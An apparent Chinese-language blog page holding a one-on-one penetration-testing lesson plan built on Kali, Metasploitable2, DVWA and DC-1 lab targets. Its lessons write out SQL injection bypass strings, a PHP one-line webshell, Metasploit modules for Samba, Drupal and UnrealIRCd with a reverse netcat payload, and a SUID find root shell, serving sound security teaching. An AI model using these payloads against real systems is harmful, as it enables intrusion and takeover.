@@ -1,0 +1,330 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="stackTang"/><meta name="copyright" content="stackTang"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="CTF,学习,靶场"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="授课计划大纲 | stackTang Blog"/><meta name="apple-mobile-web-app-title" content="授课计划大纲 | stackTang Blog"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/06/22/授课计划大纲/"/><meta name="description" content="**网络安全基础实战教学计划**详细课时安排 **第1课时：网络安全入门与环境验证 教学目标：理解渗透测试基本流程，确保实验环境100%可用。 教学内容与时序： （5分钟）开场：屏幕共享展示课程目标、CTF与考试大纲简介。老师口头提问学生“你认为黑客第一步做什么？”引发思考。 （10分钟）理论速递：渗透测试5阶段（信息收集→漏洞发现→利用→提权→报告）。展示一张简单流程图。 （30分钟）环境...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="授课计划大纲 | stackTang Blog">
+<meta property="og:url" content="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/index.html">
+<meta property="og:site_name" content="stackTang Blog">
+<meta property="og:description" content="**网络安全基础实战教学计划**详细课时安排 **第1课时：网络安全入门与环境验证 教学目标：理解渗透测试基本流程，确保实验环境100%可用。 教学内容与时序： （5分钟）开场：屏幕共享展示课程目标、CTF与考试大纲简介。老师口头提问学生“你认为黑客第一步做什么？”引发思考。 （10分钟）理论速递：渗透测试5阶段（信息收集→漏洞发现→利用→提权→报告）。展示一张简单流程图。 （30分钟）环境...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-06-22T12:48:39.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:01:42.134Z">
+<meta property="article:author" content="stackTang">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>授课计划大纲 | stackTang Blog</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/waline.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.2"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>stackTang Blog</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">stackTang Blog</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-aside-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">StackTang の 站</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">授课计划大纲</h1><div class="post-author"><span>作者: stackTang</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-06-22</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-06-22</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/CTF/" rel="tag">CTF</a><a class="post-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></span></div></div></div><div class="post markdown" indent="false"><h2 id="网络安全基础实战教学计划"><a href="#网络安全基础实战教学计划" class="headerlink" title="**网络安全基础实战教学计划"></a>**网络安全基础实战教学计划</h2><h3 id="详细课时安排"><a href="#详细课时安排" class="headerlink" title="**详细课时安排 **"></a>**详细课时安排 **</h3><h4 id="第1课时：网络安全入门与环境验证"><a href="#第1课时：网络安全入门与环境验证" class="headerlink" title="第1课时：网络安全入门与环境验证"></a><strong>第1课时：网络安全入门与环境验证</strong></h4><ul>
+<li><strong>教学目标</strong>：理解渗透测试基本流程，确保实验环境100%可用。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（5分钟）开场</strong>：屏幕共享展示课程目标、CTF与考试大纲简介。老师口头提问学生“你认为黑客第一步做什么？”引发思考。</li>
+<li><strong>（10分钟）理论速递</strong>：渗透测试5阶段（信息收集→漏洞发现→利用→提权→报告）。展示一张简单流程图。</li>
+<li><strong>（30分钟）环境验证（一对一核心）</strong>：<ul>
+<li>学生共享屏幕，老师指导：<ul>
+<li>查看Kali IP（<code>ip a</code>），启动Metasploitable2和DC-1，查看各自IP。</li>
+<li>在Kali中<code>ping</code>两个靶机IP，确认连通。</li>
+<li>学生尝试用<code>nmap -sV 靶机IP</code>扫描Metasploitable2（老师实时纠正命令格式）。</li>
+</ul>
+</li>
+<li>老师要求学生在Kali中创建一个文本文件，写入靶机IP地址，保存至桌面（验证基础文件操作）。</li>
+</ul>
+</li>
+<li><strong>（10分钟）Burp代理初步配置</strong>：老师演示如何设置Firefox代理到Burp，学生跟着做。老师检查Burp能否抓到HTTP请求。</li>
+<li><strong>（5分钟）总结与答疑</strong>：学生复述今天学到的3个命令（<code>ip a</code>, <code>ping</code>, <code>nmap</code>）。布置课后小任务：自己再扫一遍DC-1端口，下次课开始时抽查。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第2课时：信息收集与资产探测（一对一演练）"><a href="#第2课时：信息收集与资产探测（一对一演练）" class="headerlink" title="第2课时：信息收集与资产探测（一对一演练）"></a><strong>第2课时：信息收集与资产探测（一对一演练）</strong></h4><ul>
+<li><strong>教学目标</strong>：熟练掌握Nmap扫描和Web目录扫描。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（5分钟）复习</strong>：学生共享屏幕，演示扫描DC-1端口的命令及结果。老师点评。</li>
+<li><strong>（15分钟）Nmap深入讲解</strong>：<ul>
+<li>老师屏幕共享，对比<code>-sV</code>, <code>-p-</code>, <code>-A</code>参数的效果。</li>
+<li>然后让学生在自己的Kali上对Metasploitable2执行<code>nmap -sV -p- [IP]</code>，并共享屏幕，老师逐行解释输出端口（21,22,23,80,445,3306等）。</li>
+</ul>
+</li>
+<li><strong>（20分钟）Web目录扫描</strong>：<ul>
+<li>老师演示<code>dirb http：//靶机IP</code>，解释发现的&#x2F;admin,&#x2F;phpmyadmin等目录含义。</li>
+<li>学生立即对DC-1的80端口执行<code>dirb</code>，老师观察学生是否遗漏常用参数（如<code>-X .php</code>）。</li>
+</ul>
+</li>
+<li><strong>（15分钟）实战记录习惯</strong>：要求学生用Kali自带的<code>gedit</code>或<code>nano</code>记录开放端口和服务版本，保存为<code>recon.txt</code>。老师强调报告习惯。</li>
+<li><strong>（5分钟）小结</strong>：老师提问“假如你只扫到80端口开放，下一步做什么？”学生回答。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第3课时：Web安全基础与Burp-Suite实战（一对一抓包）"><a href="#第3课时：Web安全基础与Burp-Suite实战（一对一抓包）" class="headerlink" title="第3课时：Web安全基础与Burp Suite实战（一对一抓包）"></a><strong>第3课时：Web安全基础与Burp Suite实战（一对一抓包）</strong></h4><ul>
+<li><strong>教学目标</strong>：掌握Burp抓包、重放、理解Cookie&#x2F;Session，动手完成最基础的SQL注入。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（5分钟）课前检查</strong>：学生演示Burp代理是否正常工作。</li>
+<li><strong>（20分钟）Burp核心操作</strong>：<ul>
+<li>老师演示访问Metasploitable2的<code>/dvwa</code>，抓取登录POST请求，发送到Repeater，修改参数后重放。</li>
+<li>学生自己抓取一个请求（任意页面），在Repeater中修改User-Agent，观察响应变化。</li>
+</ul>
+</li>
+<li><strong>（20分钟）SQL注入入门（一对一重点）</strong>：<ul>
+<li>老师共享屏幕，在DVWA（Low安全级别）中输入<code>1&#39; or ‘1’=&#39;1</code>绕过登录。</li>
+<li>然后让学生自己尝试，并解释为什么输入<code>admin&#39; -- </code>也能登录。</li>
+<li>老师实时观察学生是否理解单引号闭合原理，可随时画图解释。</li>
+</ul>
+</li>
+<li><strong>（10分钟）课后挑战布置</strong>：要求学生用Burp Repeater手工探测字段数（<code>order by</code>），下节课口头说明结果。</li>
+<li><strong>（5分钟）答疑</strong>：解决学生关于URL编码、Cookie作用的问题。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第4课时：暴力破解与Webshell管理（蚁剑实操）"><a href="#第4课时：暴力破解与Webshell管理（蚁剑实操）" class="headerlink" title="第4课时：暴力破解与Webshell管理（蚁剑实操）"></a><strong>第4课时：暴力破解与Webshell管理（蚁剑实操）</strong></h4><ul>
+<li><strong>教学目标</strong>：学会使用Burp Intruder爆破弱口令，上传一句话木马并用蚁剑连接。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（10分钟）理论</strong>：暴力破解原理、字典作用。老师展示Kali自带的rockyou字典位置。</li>
+<li><strong>（20分钟）Burp Intruder爆破DVWA登录</strong>：<ul>
+<li>老师演示设置Payload位置、加载字典、分析响应长度差异。</li>
+<li>学生自己操作，老师观察学生是否选对“Sniper”模式、能否从响应中找出成功登录的包。</li>
+</ul>
+</li>
+<li><strong>（15分钟）一句话木马与文件上传</strong>：<ul>
+<li>老师演示编写<code>shell.php</code>内容：<code>&lt;?php @eval($_POST[‘cmd’]);？&gt;</code>。</li>
+<li>在DVWA文件上传模块上传，绕过前端JS（指导修改MaxLength或禁用JS）。</li>
+<li>学生立即尝试上传（老师远程协助处理常见错误如上传路径未知）。</li>
+</ul>
+</li>
+<li><strong>（10分钟）蚁剑连接</strong>：<ul>
+<li>老师演示添加数据，URL填写<code>http：//靶机IP/dvwa/hackable/uploads/shell.php</code>，密码<code>cmd</code>。</li>
+<li>学生自己连接，浏览文件、执行<code>whoami</code>。</li>
+</ul>
+</li>
+<li><strong>（5分钟）总结</strong>：强调Webshell权限是www-data，为后续提权做铺垫。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第5课时：Metasploit-Framework入门（一对一利用）"><a href="#第5课时：Metasploit-Framework入门（一对一利用）" class="headerlink" title="第5课时：Metasploit Framework入门（一对一利用）"></a><strong>第5课时：Metasploit Framework入门（一对一利用）</strong></h4><ul>
+<li><strong>教学目标</strong>：使用MSF自动化攻击Metasploitable2，理解漏洞利用过程。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（10分钟）MSF基本概念</strong>：老师共享屏幕，展示<code>msfconsole</code>界面，介绍<code>search</code>, <code>use</code>, <code>set</code>, <code>run</code>。</li>
+<li><strong>（30分钟）经典漏洞利用（学生主导）</strong>：<ul>
+<li>老师先演示一遍Samba漏洞（CVE-2007-2447）：<ul>
+<li><code>search samba</code> → <code>use exploit/multi/samba/usermap_script</code></li>
+<li><code>set RHOST 靶机IP</code> → <code>set payload cmd/unix/reverse_netcat</code> → <code>run</code></li>
+</ul>
+</li>
+<li>然后学生自己操作，要求学生在获得shell后执行<code>whoami</code>，并截图。</li>
+<li>老师观察学生是否忘记设置payload或LHOST，及时纠正。</li>
+</ul>
+</li>
+<li><strong>（10分钟）探索其他漏洞</strong>：老师提示vsftpd 2.3.4漏洞（端口21），让学生自己搜索并尝试利用（若时间充裕，作为课堂挑战）。</li>
+<li><strong>（10分钟）反向连接原理解释</strong>：老师用白板工具画图，解释为什么需要<code>LHOST</code>（攻击机IP）。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第6课时：DC-1靶机实战（上）——Drupal漏洞利用"><a href="#第6课时：DC-1靶机实战（上）——Drupal漏洞利用" class="headerlink" title="第6课时：DC-1靶机实战（上）——Drupal漏洞利用"></a><strong>第6课时：DC-1靶机实战（上）——Drupal漏洞利用</strong></h4><ul>
+<li><strong>教学目标</strong>：综合运用Nmap、MSF攻击DC-1，获取第一个flag。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（5分钟）任务发布</strong>：老师给出目标——拿下DC-1的flag1。</li>
+<li><strong>（10分钟）学生独立信息收集</strong>：学生共享屏幕，对DC-1执行Nmap扫描，老师观察并纠正。</li>
+<li><strong>（25分钟）MSF利用Drupal漏洞</strong>：<ul>
+<li>老师演示<code>search drupal</code>，选择<code>exploit/unix/webapp/drupal_drupalgeddon2</code>。</li>
+<li>设置<code>RHOSTS</code>，<code>exploit</code>获得Meterpreter shell。</li>
+<li>然后学生自己做（老师提前提醒可能需要设置<code>TARGETURI</code>为<code>/</code>）。</li>
+</ul>
+</li>
+<li><strong>（15分钟）寻找flag1</strong>：<ul>
+<li>学生在Meterpreter shell中执行<code>shell</code>，<code>cat flag1.txt</code>。</li>
+<li>阅读提示，老师引导学生思考“配置文件通常在哪”，学生自己尝试<code>find / -name *settings.php 2&gt;/dev/null</code>。</li>
+</ul>
+</li>
+<li><strong>（5分钟）小结</strong>：记录flag1内容，并强调CMS漏洞的危害。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第7课时：DC-1靶机实战（下）——数据库与提权（一对一突破）"><a href="#第7课时：DC-1靶机实战（下）——数据库与提权（一对一突破）" class="headerlink" title="第7课时：DC-1靶机实战（下）——数据库与提权（一对一突破）"></a><strong>第7课时：DC-1靶机实战（下）——数据库与提权（一对一突破）</strong></h4><ul>
+<li><strong>教学目标</strong>：读取数据库配置、破解密码、SUID提权，完成完整攻击链。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（10分钟）读取数据库配置</strong>：<ul>
+<li>老师提示路径<code>/var/www/html/sites/default/settings.php</code>，学生用<code>cat</code>读取，找到数据库用户名密码。</li>
+<li>学生自己执行，老师检查是否遗漏。</li>
+</ul>
+</li>
+<li><strong>（20分钟）数据库操作与密码破解</strong>：<ul>
+<li>学生连接MySQL：<code>mysql -u dbuser -p</code>，输入密码。</li>
+<li>查询users表，获得admin的密码哈希。</li>
+<li>老师演示将哈希保存到文件，使用<code>john</code>破解（可预先告诉学生弱密码为“123456”或“password”，以节省时间）。</li>
+<li>学生自己执行破解命令。</li>
+</ul>
+</li>
+<li><strong>（20分钟）SUID提权</strong>：<ul>
+<li>老师提问“如何查找有SUID权限的文件”，学生尝试<code>find / -perm -4000 2&gt;/dev/null</code>。</li>
+<li>发现<code>/usr/bin/find</code>，老师讲解SUID原理，然后学生执行<code>find / -exec “/bin/sh” \;</code>获得root shell。</li>
+<li>读取<code>/root/flag3.txt</code>。</li>
+</ul>
+</li>
+<li><strong>（10分钟）整体攻击链复盘</strong>：老师引导学生口述从信息收集到root的每一步，学生共享屏幕整理笔记。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h4 id="第8课时：综合演练与考试对接（模拟实战）"><a href="#第8课时：综合演练与考试对接（模拟实战）" class="headerlink" title="第8课时：综合演练与考试对接（模拟实战）"></a><strong>第8课时：综合演练与考试对接（模拟实战）</strong></h4><ul>
+<li><strong>教学目标</strong>：独立完成Metasploitable2-Linux上三个flag的获取，对接考试题型。</li>
+<li><strong>教学内容与时序</strong>：<ol>
+<li><strong>（5分钟）发布任务</strong>：老师给出三个目标（同原计划）：<ul>
+<li>Flag1：MySQL服务版本。</li>
+<li>Flag2：利用UnrealIRCd漏洞（端口6667）获得shell，找到当前用户名。</li>
+<li>Flag3：Web目录下敏感配置文件中的密码。</li>
+</ul>
+</li>
+<li><strong>（40分钟）学生独立操作（老师静默观察）</strong>：<ul>
+<li>学生共享屏幕，全程自己操作，老师只在遇到卡死或严重错误时提示。</li>
+<li>记录学生每个步骤的时间，课后反馈给其改进点。</li>
+</ul>
+</li>
+<li><strong>（10分钟）关键步骤讲解</strong>：<ul>
+<li>老师演示UnrealIRCd漏洞利用（MSF中<code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>），并解释为何无需认证。</li>
+<li>展示Flag3常见位置（如<code>/var/www/config.php</code>）。</li>
+</ul>
+</li>
+<li><strong>（5分钟）考试技巧与后续路径</strong>：<ul>
+<li>强调Flag提交格式<code>flag{...}</code>，每做完一题立即记录。</li>
+<li>推荐在线练习平台：BugKu、CTFshow、Hack The Box。</li>
+<li>告知学生下节课可开始学习《2026大纲》中的逆向或密码学基础（根据兴趣定制）。</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 stackTang 于 2026-06-22 20:48:39 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/">授课计划大纲</a></span><button class="copy-text" type="button" data-text="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>stackTang Blog</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/CTF/" rel="tag">CTF</a><a class="post-tail-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tail-tags-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></div><div class="post-nav"><a class="post-nav-prev" href="/2026/06/22/%E4%BC%9A%E8%AE%AE%E7%BA%AA%E8%A6%81810/" title="会议纪要810">上一篇<span>会议纪要810</span></a><a class="post-nav-next" href="/2026/06/22/%E6%8A%80%E6%88%98%E6%B3%95/" title="技战法">下一篇<span>技战法</span></a></div><div class="comment"><div id="waline"></div></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6%E8%AE%A1%E5%88%92"><span class="toc-list-text">**网络安全基础实战教学计划</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%AF%A6%E7%BB%86%E8%AF%BE%E6%97%B6%E5%AE%89%E6%8E%92"><span class="toc-list-text">**详细课时安排 **</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2026/06/22/%E6%8E%88%E8%AF%BE%E8%AE%A1%E5%88%92%E5%A4%A7%E7%BA%B2/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
+搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2026 <span>💗</span> <a href="/null">stackTang</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2026-07-13T23:13:13.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: false,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: true,
+    path: 'search.xml',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline',
+      serverURL: 'https://dischat-9perr1k34-tangriweilis-projects.vercel.app',
+      lang: 'zh-CN',
+      dark: 'body[data-mode="dark"]',
+      emoji: null,
+      reaction: null,
+      path: window.location.pathname.replace(/([^\/#]+)(?:#.+|)$/,'$1/'),
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      let jsPath = ''
+      if (false) {
+        jsPath = 'dist/waline.js'
+      } else {
+        jsPath = '/js/plugins/dist/waline.js'
+      }
+      const { init } = await import(jsPath)
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if (true) {
+    meow.lazyloadFn(document.getElementById('waline'), loadWaline)
+  } else {
+    loadWaline()
+  }
+})()</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/plugins/dist/search.js"></script>
+
+<script src="/js/main.js" type="module"></script>
+<script src="https://fastly.jsdelivr.net/npm/live2d-widget@3.1.4/lib/L2Dwidget.min.js"></script><script>(function () {
+  const initLive2D = function () {
+    if (!window.L2Dwidget) return;
+    window.L2Dwidget.init({"model":{"jsonPath":"https://fastly.jsdelivr.net/npm/live2d-widget-model-hijiki@1.0.5/assets/hijiki.model.json","scale":1},"display":{"position":"right","width":150,"height":300,"hOffset":150,"vOffset":-15},"mobile":{"show":true,"scale":0.55},"react":{"opacityDefault":0.88,"opacityOnHover":0.25}});
+  };
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLive2D, { once: true });
+  } else {
+    initLive2D();
+  }
+})();</script></div></body></html>
